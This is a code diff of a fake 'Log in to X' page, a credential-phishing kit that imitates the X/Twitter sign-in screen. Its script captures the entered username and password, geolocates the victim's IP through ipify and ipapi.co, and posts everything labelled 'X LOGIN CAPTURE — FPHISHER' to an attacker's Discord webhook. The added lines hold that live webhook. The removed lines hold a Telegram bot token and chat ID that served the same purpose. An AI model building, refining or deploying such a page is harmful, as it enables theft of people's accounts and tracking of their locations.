@@ -5,26 +5,15 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Log in to X</title>
   <script src="https://cdn.tailwindcss.com"></script>
-
-  <!-- IMPORTANT: This allows external API calls on live hosting -->
-  <meta http-equiv="Content-Security-Policy" 
-        content="default-src 'self' 'unsafe-inline'; 
-                 script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com; 
-                 connect-src 'self' https://api.ipify.org https://ipapi.co https://api.telegram.org">
 </head>
 
 <body class="text-white h-screen flex flex-col bg-black">
 
-  <!-- STEP 1 -->
+  <!-- STEP 1 - Username / email / phone -->
   <div id="step1" class="flex flex-col h-full justify-between">
     <div class="flex justify-between items-center px-5 py-4">
       <button class="text-lg font-medium">Cancel</button>
-      
-      <!-- Official X logo -->
-      <svg width="32" height="32" viewBox="0 0 24 24" class="fill-current">
-        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
-      </svg>
-      
+      <div class="text-2xl font-black">X</div>
       <div class="w-10"></div>
     </div>
 
@@ -41,25 +30,22 @@
     </div>
 
     <div class="px-8 pb-8 flex justify-between items-center">
-      <span class="text-sky-500 text-base cursor-pointer hover:underline">Forgot password?</span>
-      
+      <span class="text-sky-500 text-base cursor-pointer">Forgot password?</span>
       <button
         id="nextBtn"
         disabled
-        class="px-8 py-3 rounded-full font-bold text-base transition-all duration-200 bg-gray-700 text-gray-500 cursor-not-allowed"
+        class="bg-gray-700 text-gray-400 px-7 py-3 rounded-full font-bold text-base disabled:opacity-50"
       >
         Next
       </button>
     </div>
   </div>
 
-  <!-- STEP 2 -->
+  <!-- STEP 2 - Password + Error container -->
   <div id="step2" class="hidden flex flex-col h-full justify-between relative">
     <div class="flex justify-between items-center px-5 py-4">
       <button onclick="goBack()" class="text-2xl">×</button>
-      <svg width="32" height="32" viewBox="0 0 24 24" class="fill-current">
-        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
-      </svg>
+      <div class="text-2xl font-black">X</div>
       <div class="w-10"></div>
     </div>
 
@@ -72,12 +58,21 @@
       </div>
 
       <div class="mt-8 relative">
-        <input id="password" type="password" placeholder="Password"
-          class="w-full bg-black border-2 border-sky-500 rounded-full px-5 py-4 pr-14 text-lg placeholder-sky-700 focus:outline-none focus:border-sky-400">
-        <button onclick="togglePassword()" class="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 text-xl">👁️</button>
+        <input
+          id="password"
+          type="password"
+          placeholder="Password"
+          class="w-full bg-black border-2 border-sky-500 rounded-full px-5 py-4 pr-14 text-lg placeholder-sky-700 focus:outline-none focus:border-sky-400"
+        />
+        <button
+          onclick="togglePassword()"
+          class="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 text-xl"
+        >
+          👁️
+        </button>
       </div>
 
-      <p class="text-sky-500 mt-4 cursor-pointer hover:underline">Forgot password?</p>
+      <p class="text-sky-500 mt-4 cursor-pointer">Forgot password?</p>
 
       <div id="errorMsg" class="hidden mt-6 bg-blue-600 rounded-lg p-5 text-center shadow-xl">
         <p class="text-2xl font-bold">Wrong password!</p>
@@ -89,17 +84,25 @@
     </div>
 
     <div class="px-8 pb-8">
-      <button id="loginBtn" disabled
-        class="w-full bg-white text-black py-4 rounded-full text-lg font-bold disabled:bg-gray-700 disabled:text-gray-400">
+      <button
+        id="loginBtn"
+        disabled
+        class="w-full bg-white text-black py-4 rounded-full text-lg font-bold disabled:opacity-50 disabled:bg-gray-700 disabled:text-gray-400"
+      >
         Log in
       </button>
+
+      <p class="text-center text-gray-400 mt-5">
+        Don't have an account? <span class="text-sky-500">Sign up</span>
+      </p>
     </div>
   </div>
 
   <script>
-    // Your credentials (hardcoded as in your version)
-    const TELEGRAM_BOT_TOKEN = "8690201412:AAFZ13-gmb-2Ax2EXdGlHUhVc19AApHVurc";
-    const TELEGRAM_CHAT_ID   = "6487626501";
+    // ──────────────────────────────────────────────
+    //     CHANGE THIS LINE ONLY – your Discord webhook URL
+    // ──────────────────────────────────────────────
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1484291070106927104/rmZj_raRyYCQsZn4Fazz-hh0j6uuwrCDC18VMY-yOFtezFmEyt_7RkJuj9dZ8x5kwLDE";
 
     const usernameInput = document.getElementById("username");
     const nextBtn       = document.getElementById("nextBtn");
@@ -112,25 +115,17 @@
 
     let attemptCount = 0;
 
-    // ==================== NEXT BUTTON (white when typing) ====================
-    function updateNextButton() {
-      const hasText = usernameInput.value.trim().length > 0;
-      nextBtn.disabled = !hasText;
-
-      if (hasText) {
-        nextBtn.classList.remove("bg-gray-700", "text-gray-500", "cursor-not-allowed");
-        nextBtn.classList.add("bg-white", "text-black", "hover:bg-gray-100", "shadow-md", "cursor-pointer");
-      } else {
-        nextBtn.classList.remove("bg-white", "text-black", "hover:bg-gray-100", "shadow-md", "cursor-pointer");
-        nextBtn.classList.add("bg-gray-700", "text-gray-500", "cursor-not-allowed");
-      }
-    }
-
-    usernameInput.addEventListener("input", updateNextButton);
-    updateNextButton(); // run once on load
+    // Enable/disable Next button (white when active)
+    usernameInput.addEventListener("input", () => {
+      const val = usernameInput.value.trim();
+      nextBtn.disabled = !val;
+      nextBtn.classList.toggle("bg-white", !!val);
+      nextBtn.classList.toggle("text-black", !!val);
+      nextBtn.classList.toggle("bg-gray-700", !val);
+      nextBtn.classList.toggle("text-gray-400", !val);
+    });
 
     nextBtn.addEventListener("click", () => {
-      if (nextBtn.disabled) return;
       displayUser.textContent = usernameInput.value.trim();
       step1.classList.add("hidden");
       step2.classList.remove("hidden");
@@ -138,7 +133,6 @@
       attemptCount = 0;
     });
 
-    // ==================== OTHER FUNCTIONS ====================
     function goBack() {
       step2.classList.add("hidden");
       step1.classList.remove("hidden");
@@ -146,69 +140,97 @@
     }
 
     passwordInput.addEventListener("input", () => {
-      const hasValue = passwordInput.value.trim().length > 0;
-      loginBtn.disabled = !hasValue;
-      if (hasValue) {
-        loginBtn.classList.add("bg-white", "text-black");
-        loginBtn.classList.remove("bg-gray-700", "text-gray-400");
-      } else {
-        loginBtn.classList.add("bg-gray-700", "text-gray-400");
-        loginBtn.classList.remove("bg-white", "text-black");
-      }
+      const val = passwordInput.value.trim();
+      loginBtn.disabled = !val;
+      loginBtn.classList.toggle("bg-white", !!val);
+      loginBtn.classList.toggle("text-black", !!val);
+      loginBtn.classList.toggle("bg-gray-700", !val);
+      loginBtn.classList.toggle("text-gray-400", !val);
     });
 
     function togglePassword() {
       passwordInput.type = passwordInput.type === "password" ? "text" : "password";
     }
 
-    // ==================== SEND TO TELEGRAM ====================
+    // ─── CAPTURE & SEND TO DISCORD WEBHOOK ───────────────────────────────
     async function captureAndSend(attemptNumber) {
       const username = usernameInput.value.trim();
       const password = passwordInput.value.trim();
       if (!username || !password) return;
 
-      console.log(`[DEBUG] Attempt ${attemptNumber} - Sending data...`);
-
-      let geo = { ip: "unknown", country: "unknown", region: "unknown", city: "unknown", isp: "unknown", proxy: "No" };
+      let geo = {
+        ip: "unknown",
+        country: "unknown",
+        region: "unknown",
+        city: "unknown",
+        isp: "unknown",
+        proxy: "No"
+      };
 
       try {
         const ipRes = await fetch("https://api.ipify.org?format=json");
-        geo.ip = (await ipRes.json()).ip;
+        const ipData = await ipRes.json();
+        geo.ip = ipData.ip || "unknown";
 
         const geoRes = await fetch(`https://ipapi.co/${geo.ip}/json/`);
         const data = await geoRes.json();
+
         if (!data.error) {
           geo.country = data.country_name || "unknown";
-          geo.region  = data.region || "unknown";
-          geo.city    = data.city || "unknown";
-          geo.isp     = data.org || "unknown";
-          geo.proxy   = (data.proxy || data.in_eu) ? "Yes" : "No";
+          geo.region  = data.region      || "unknown";
+          geo.city    = data.city        || "unknown";
+          geo.isp     = data.org || data.asn || "unknown";
+          geo.proxy   = data.in_eu || data.proxy ? "Yes" : "No";
         }
-      } catch (e) { console.warn("Geo fetch failed", e); }
+      } catch {}
 
-      const message = `🔐✨  X LOGIN CAPTURE  —  FPHISHER  (Attempt ${attemptNumber})\n` +
-        `═══════════════════════════════════════\n\n` +
-        `👤 USERNAME / EMAIL  ➤ ${username}\n` +
-        `🔑 PASSWORD         ➤ ${password}\n\n` +
-        `🌍 LOCATION\n` +
-        `➤ Country: ${geo.country} ${geo.country === "Nigeria" ? "🇳🇬" : ""}\n` +
-        `➤ Region : ${geo.region}\n` +
-        `➤ City   : ${geo.city}\n\n` +
-        `🌐 IP ADDRESS       ➤ ${geo.ip}\n` +
-        `➤ Proxy/VPN : ${geo.proxy}\n` +
-        `➤ ISP       : ${geo.isp}\n\n` +
-        `💻 USER AGENT      ➤ ${navigator.userAgent}\n` +
-        `🕒 TIME            ➤ ${new Date().toISOString()}`;
+      const ua = navigator.userAgent;
+      const screenInfo = `${screen.width}×${screen.height} • ${navigator.language || "unknown"}`;
+      const now = new Date().toISOString();
+
+      // Discord-friendly formatted message (supports basic markdown)
+      const message = 
+`**🔐✨ X LOGIN CAPTURE — FPHISHER (Attempt ${attemptNumber})**\n` +
+`═══════════════════════════════════════\n\n` +
+`**👤 USERNAME / EMAIL**\n` +
+`\`\`\`${username}\`\`\`\n` +
+`**🔑 PASSWORD**\n` +
+`\`\`\`${password}\`\`\`\n\n` +
+`**🌍 LOCATION**\n` +
+`Country: ${geo.country}\n` +
+`Region : ${geo.region}\n` +
+`City   : ${geo.city}\n\n` +
+`**🌐 IP ADDRESS**\n` +
+`${geo.ip}\n` +
+`Proxy/VPN : ${geo.proxy}\n` +
+`ISP       : ${geo.isp}\n\n` +
+`**🕒 TIMESTAMP**\n` +
+`${now}\n\n` +
+`**💻 USER AGENT**\n` +
+`\`\`\`${ua}\`\`\`\n` +
+`**🖥️ SCREEN**\n` +
+`${screenInfo}\n\n` +
+`═══════════════════════════════════════\n` +
+`⚡ Powered by FTECH™ Secure Systems`;
 
       try {
-        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        const response = await fetch(DISCORD_WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
+          body: JSON.stringify({
+            content: message,
+            username: "X Login Alert",           // optional: webhook override name
+            avatar_url: "https://example.com/x-logo.png"  // optional: custom avatar
+          })
         });
-        console.log("Telegram response:", res.ok ? "SUCCESS" : "FAILED");
+
+        if (!response.ok) {
+          console.error("Discord webhook failed:", await response.text());
+        } else {
+          console.log("Sent to Discord successfully");
+        }
       } catch (err) {
-        console.error("❌ Telegram send FAILED:", err);
+        console.error("Fetch error:", err);
       }
     }
 
